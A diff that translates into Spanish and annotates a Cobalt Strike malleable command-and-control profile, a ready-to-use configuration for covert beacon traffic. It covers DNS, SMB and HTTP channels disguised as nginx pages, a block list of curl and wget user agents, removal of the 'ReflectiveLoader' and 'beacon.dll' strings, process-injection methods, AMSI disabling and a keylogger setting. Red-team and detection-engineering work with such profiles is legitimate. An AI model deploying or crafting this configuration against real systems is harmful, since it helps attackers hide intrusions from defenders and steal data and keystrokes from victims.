@@ -1,387 +1,326 @@
-#clean template profile - no comments, cleaned up, hopefully easier to build new profiles off of.
-#updated with 4.3 options
-#xx0hcd
+# Plantilla de perfil limpia - sin comentarios, limpiada, con suerte más fácil de construir nuevos perfiles a partir de ella.
+# Actualizado con opciones de la versión 4.3
+# xx0hcd
 
-###Global Options###
+### Opciones Globales ###
+# Nombre del perfil
 set sample_name "clean.profile";
 
+# Tiempo de espera en milisegundos entre las comunicaciones del beacon
 set sleeptime "37500";
-set jitter    "33";
+
+# Porcentaje de variación aleatoria en el tiempo de espera
+set jitter "33";
+
+# Agente de usuario que se utilizará en las solicitudes HTTP
 set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
+
+# Porcentaje de variación aleatoria en el tamaño de los datos enviados
 set data_jitter "50";
 
+# Indica si se debe alojar la etapa en el servidor
 set host_stage "false";
 
-###DNS options###
+### Opciones DNS ###
 dns-beacon {
-    # Options moved into 'dns-beacon' group in 4.3:
-    set dns_idle             "8.8.8.8";
-    set dns_max_txt          "220";
-    set dns_sleep            "0";
-    set dns_ttl              "1";
-    set maxdns               "255";
-    set dns_stager_prepend   ".wwwds.";
-    set dns_stager_subhost   ".e2867.dsca.";
-     
-    # DNS subhost override options added in 4.3:
-    set beacon               "d-bx.";
-    set get_A                "d-1ax.";
-    set get_AAAA             "d-4ax.";
-    set get_TXT              "d-1tx.";
-    set put_metadata         "d-1mx";
-    set put_output           "d-1ox.";
-    set ns_response          "zero";
+    # Dirección IP del servidor DNS inactivo
+    set dns_idle "8.8.8.8";
+
+    # Tamaño máximo de los registros TXT DNS
+    set dns_max_txt "220";
+
+    # Tiempo de espera en segundos entre las consultas DNS
+    set dns_sleep "0";
+
+    # Tiempo de vida (TTL) de los registros DNS en segundos
+    set dns_ttl "1";
+
+    # Número máximo de consultas DNS
+    set maxdns "255";
+
+    # Prefijo para el stager DNS
+    set dns_stager_prepend ".wwwds.";
+
+    # Subhost para el stager DNS
+    set dns_stager_subhost ".e2867.dsca.";
+
+    # Opciones de anulación de subhost DNS
+    set beacon "d-bx.";
+    set get_A "d-1ax.";
+    set get_AAAA "d-4ax.";
+    set get_TXT "d-1tx.";
+    set put_metadata "d-1mx";
+    set put_output "d-1ox.";
+    set ns_response "zero";
 }
 
-###SMB options###
+### Opciones SMB ###
+# Nombre del pipe para la comunicación SMB
 set pipename "ntsvcs##";
+
+# Nombre del pipe para el stager SMB
 set pipename_stager "scerpc##";
+
+# Encabezado del frame SMB
 set smb_frame_header "";
 
-###TCP options###
+### Opciones TCP ###
+# Puerto TCP para la comunicación
 set tcp_port "8000";
+
+# Encabezado del frame TCP
 set tcp_frame_header "";
 
-###SSH options###
+### Opciones SSH ###
+# Banner que se muestra al conectarse por SSH
 set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+
+# Nombre del pipe para la comunicación SSH
 set ssh_pipename "SearchTextHarvester##";
 
-###SSL Options###
-#https-certificate {
-    #set keystore "your_store_file.store";
-    #set password "your_store_pass";
-#}
-
+### Opciones SSL ###
+# Configuración del certificado HTTPS
 https-certificate {
-    set C "US";
-    set CN "whatever.com";
-    set L "California";
-    set O "whatever LLC.";
-    set OU "local.org";
-    set ST "CA";
-    set validity "365";
+    set C "US";  # País
+    set CN "whatever.com";  # Nombre común
+    set L "California";  # Localidad
+    set O "whatever LLC.";  # Organización
+    set OU "local.org";  # Unidad organizativa
+    set ST "CA";  # Estado
+    set validity "365";  # Validez del certificado en días
 }
 
-#code-signer {
-    #set keystore "your_keystore.jks";
-    #set password "your_password";
-    #set alias "server";
-#}
-
-###HTTP-Config Block###
+### Bloque de Configuración HTTP ###
 http-config {
+    # Encabezados HTTP a configurar
     set headers "Server, Content-Type";
-    header "Server" "nginx";
+    header "Server" "nginx";  # Valor del encabezado "Server"
 
+    # Indica si se debe confiar en el encabezado X-Forwarded-For
     set trust_x_forwarded_for "false";
-    
+
+    # Agentes de usuario que deben ser bloqueados
     set block_useragents "curl*,lynx*,wget*";
 }
 
-#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";
-
-###HTTP-GET Block###
+### Bloque HTTP-GET ###
 http-get {
-
+    # URIs para las solicitudes GET
     set uri "/login /config /admin";
 
-    #set verb "POST";
-    
     client {
-
+        # Encabezados HTTP del cliente
         header "Host" "whatever.com";
         header "Connection" "close";
 
-	   
-    metadata {
-        #base64
-        base64url;
-        #mask;
-        #netbios;
-        #netbiosu;
-        #prepend "TEST123";
-        append ".php";
+        metadata {
+            base64url;  # Codificación de los metadatos en base64 URL
+            append ".php";  # Sufijo para los metadatos
 
-        parameter "file";
-        #header "Cookie";
-        #uri-append;
+            parameter "file";  # Parámetro para los metadatos
+        }
 
-        #print;
-    }
-
-    parameter "test1" "test2";
+        parameter "test1" "test2";  # Parámetros adicionales
     }
 
     server {
-        #header "Server" "nginx";
- 
         output {
-
-            netbios;
-            #netbiosu;
-            #base64;
-            #base64url;
-            #mask;
-            	       
-	    prepend "content=";
-
-	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
-
-            print;
+            netbios;  # Codificación de la salida en formato NetBIOS
+            prepend "content=";  # Prefijo para la salida
+            append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";  # Sufijo para la salida
+            print;  # Imprimir la salida
         }
     }
 }
 
-###HTTP-GET VARIANT###
+### Variante HTTP-GET ###
 http-get "variant_name_get" {
-
+    # URIs para las solicitudes GET
     set uri "/uri1 /uri2 /uri3";
 
-    #set verb "POST";
-    
     client {
-
+        # Encabezados HTTP del cliente
         header "Host" "whatever.com";
         header "Connection" "close";
 
-	   
-    metadata {
+        metadata {
+            base64url;  # Codificación de los metadatos en base64 URL
+            append ".php";  # Sufijo para los metadatos
 
-        base64url;
-        append ".php";
+            parameter "file";  # Parámetro para los metadatos
+        }
 
-        parameter "file";
-        #header "Cookie";
-        #uri-append;
-
-        #print;
-    }
-
-    parameter "test1" "test2";
+        parameter "test1" "test2";  # Parámetros adicionales
     }
 
     server {
-        #header "Server" "nginx";
- 
         output {
-
-            netbios;
-            	       
-	    prepend "content=";
-
-	    append "\n<meta name=\n";
-
-            print;
+            netbios;  # Codificación de la salida en formato NetBIOS
+            prepend "content=";  # Prefijo para la salida
+            append "\n<meta name=\n";  # Sufijo para la salida
+            print;  # Imprimir la salida
         }
     }
 }
 
-###HTTP-Post Block###
+### Bloque HTTP-POST ###
 http-post {
-    
+    # URIs para las solicitudes POST
     set uri "/Login /Config /Admin";
-    set verb "GET";
-    #set verb "POST";
+    set verb "GET";  # Verbo HTTP a utilizar
 
     client {
+        # Encabezados HTTP del cliente
+        header "Host" "whatever.com";
+        header "Connection" "close";
 
-	header "Host" "whatever.com";
-	header "Connection" "close";     
-        
         output {
-            base64url; 
-	    parameter "testParam";
+            base64url;  # Codificación de la salida en base64 URL
+            parameter "testParam";  # Parámetro para la salida
         }
 
         id {
-	    base64url;
-	    parameter "id";
-            #header "ID-Header";
-
+            base64url;  # Codificación del ID en base64 URL
+            parameter "id";  # Parámetro para el ID
         }
     }
 
     server {
-        #header "Server" "nginx";
-
         output {
-            netbios;	    
-	   
-	    prepend "content=";
-
-	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
-
-            print;
+            netbios;  # Codificación de la salida en formato NetBIOS
+            prepend "content=";  # Prefijo para la salida
+            append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";  # Sufijo para la salida
+            print;  # Imprimir la salida
         }
     }
 }
 
-###HTTP-POST VARIANT###
+### Variante HTTP-POST ###
 http-post "variant_name_post" {
-    
+    # URIs para las solicitudes POST
     set uri "/Uri1 /Uri2 /Uri3";
-    set verb "GET";
-    #set verb "POST";
+    set verb "GET";  # Verbo HTTP a utilizar
 
     client {
+        # Encabezados HTTP del cliente
+        header "Host" "whatever.com";
+        header "Connection" "close";
 
-	header "Host" "whatever.com";
-	header "Connection" "close";     
-        
         output {
-            base64url; 
-	    parameter "testParam";
+            base64url;  # Codificación de la salida en base64 URL
+            parameter "testParam";  # Parámetro para la salida
         }
 
         id {
-	    base64url;
-	    parameter "id";
-
+            base64url;  # Codificación del ID en base64 URL
+            parameter "id";  # Parámetro para el ID
         }
     }
 
     server {
-        #header "Server" "nginx";
-
         output {
-            netbios;	    
-	   
-	    prepend "content=";
-
-	    append "\n<meta name=\n";
-
-            print;
+            netbios;  # Codificación de la salida en formato NetBIOS
+            prepend "content=";  # Prefijo para la salida
+            append "\n<meta name=\n";  # Sufijo para la salida
+            print;  # Imprimir la salida
         }
     }
 }
 
-###HTTP-Stager Block###
+### Bloque HTTP-Stager ###
 http-stager {
-
+    # URIs para el stager HTTP
     set uri_x86 "/Console";
     set uri_x64 "/console";
 
     client {
+        # Encabezados HTTP del cliente
         header "Host" "whatever.com";
         header "Connection" "close";
-	
-	#parameter "test1" "test2";
     }
 
     server {
-        #header "Server" "nginx";
-	
-	output {
-	
-	    prepend "content=";
-	    
-	    append "</script>\n";
-	    print;
-	}
-
+        output {
+            prepend "content=";  # Prefijo para la salida
+            append "</script>\n";  # Sufijo para la salida
+            print;  # Imprimir la salida
+        }
     }
 }
 
-
-###Malleable PE/Stage Block###
+### Bloque Malleable PE/Stage ###
 stage {
-    set checksum        "0";
-    set compile_time    "25 Oct 2016 01:57:23";
-    set entry_point     "170000";
-    #set image_size_x86 "6586368";
-    #set image_size_x64 "6586368";
-    #set name	        "WWanMM.dll";
-    set userwx 	        "false";
-    set cleanup	        "true";
-    set sleep_mask	"true";
-    set stomppe	        "true";
-    set obfuscate	"true";
-    set rich_header     "";
-    
-    #new 4.2. options   
-    #set allocator "HeapAlloc";
-    #set magic_mz_x86 "MZRE";
-    #set magic_mz_x64 "MZAR";
-    #set magic_pe "PE";
-    
-    set sleep_mask "true";
-    set smartinject "true";
+    set checksum "0";  # Suma de verificación
+    set compile_time "25 Oct 2016 01:57:23";  # Fecha y hora de compilación
+    set entry_point "170000";  # Punto de entrada
+    set userwx "false";  # Indica si se permite la escritura y ejecución de la memoria
+    set cleanup "true";  # Indica si se debe limpiar después de la ejecución
+    set sleep_mask "true";  # Indica si se debe enmascarar el sueño
+    set stomppe "true";  # Indica si se debe sobrescribir el encabezado PE
+    set obfuscate "true";  # Indica si se debe ofuscar el código
+    set rich_header "";  # Encabezado Rich
 
-    set module_x86 "wwanmm.dll";
-    set module_x64 "wwanmm.dll";
+    # Opciones nuevas en la versión 4.2
+    set sleep_mask "true";  # Indica si se debe enmascarar el sueño
+    set smartinject "true";  # Indica si se debe utilizar la inyección inteligente
+
+    set module_x86 "wwanmm.dll";  # Módulo para x86
+    set module_x64 "wwanmm.dll";  # Módulo para x64
 
     transform-x86 {
-        prepend "\x90\x90\x90";
-        strrep "ReflectiveLoader" "";
-        strrep "beacon.dll" "";
-        }
+        prepend "\x90\x90\x90";  # Prefijo para la transformación x86
+        strrep "ReflectiveLoader" "";  # Reemplazo de cadena para la transformación x86
+        strrep "beacon.dll" "";  # Reemplazo de cadena para la transformación x86
+    }
 
     transform-x64 {
-        prepend "\x90\x90\x90";
-        strrep "ReflectiveLoader" "";
-        strrep "beacon.x64.dll" "";
-        }
+        prepend "\x90\x90\x90";  # Prefijo para la transformación x64
+        strrep "ReflectiveLoader" "";  # Reemplazo de cadena para la transformación x64
+        strrep "beacon.x64.dll" "";  # Reemplazo de cadena para la transformación x64
+    }
 
-    #string "something";
-    #data "something";
-    stringw "something"; 
+    stringw "something";  # Cadena de ejemplo
 }
 
-###Process Inject Block###
+### Bloque de Inyección de Procesos ###
 process-inject {
+    set allocator "NtMapViewOfSection";  # Asignador de memoria
 
-    set allocator "NtMapViewOfSection";		
+    set min_alloc "16700";  # Tamaño mínimo de asignación de memoria
 
-    set min_alloc "16700";
+    set userwx "false";  # Indica si se permite la escritura y ejecución de la memoria
 
-    set userwx "false";  
-    
-    set startrwx "true";
-        
+    set startrwx "true";  # Indica si se permite la escritura y ejecución al inicio
+
     transform-x86 {
-        prepend "\x90\x90\x90";
+        prepend "\x90\x90\x90";  # Prefijo para la transformación x86
     }
     transform-x64 {
-        prepend "\x90\x90\x90";
+        prepend "\x90\x90\x90";  # Prefijo para la transformación x64
     }
 
     execute {
-        #CreateThread;
-        #CreateRemoteThread;       
-
-        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
-
-        SetThreadContext;
-
-        NtQueueApcThread-s;
-
-        #NtQueueApcThread;
-
-        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
-
-        RtlCreateUserThread;
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";  # Crear hilo en ntdll.dll
+        SetThreadContext;  # Establecer contexto del hilo
+        NtQueueApcThread-s;  # Colocar APC en el hilo
+        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";  # Crear hilo remoto en kernel32.dll
+        RtlCreateUserThread;  # Crear hilo de usuario en ntdll.dll
     }
 }
 
-###Post-Ex Block###
+### Bloque Post-Ex ###
 post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";  # Ruta del ejecutable para x86
+    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";  # Ruta del ejecutable para x64
 
+    set obfuscate "true";  # Indica si se debe ofuscar el código
 
-    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
-    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
+    set smartinject "true";  # Indica si se debe utilizar la inyección inteligente
 
-    #set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-    #set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+    set amsi_disable "true";  # Indica si se debe deshabilitar AMSI
 
-    set obfuscate "true";
-
-    set smartinject "true";
-
-    set amsi_disable "true";
-    
-    #new 4.2 options
-    set thread_hint "ntdll.dll!RtlUserThreadStart";
-    set pipename "DserNamePipe##";
-    set keylogger "SetWindowsHookEx";
-
+    # Opciones nuevas en la versión 4.2
+    set thread_hint "ntdll.dll!RtlUserThreadStart";  # Pista de hilo
+    set pipename "DserNamePipe##";  # Nombre del pipe
+    set keylogger "SetWindowsHookEx";  # Método de keylogger
 }
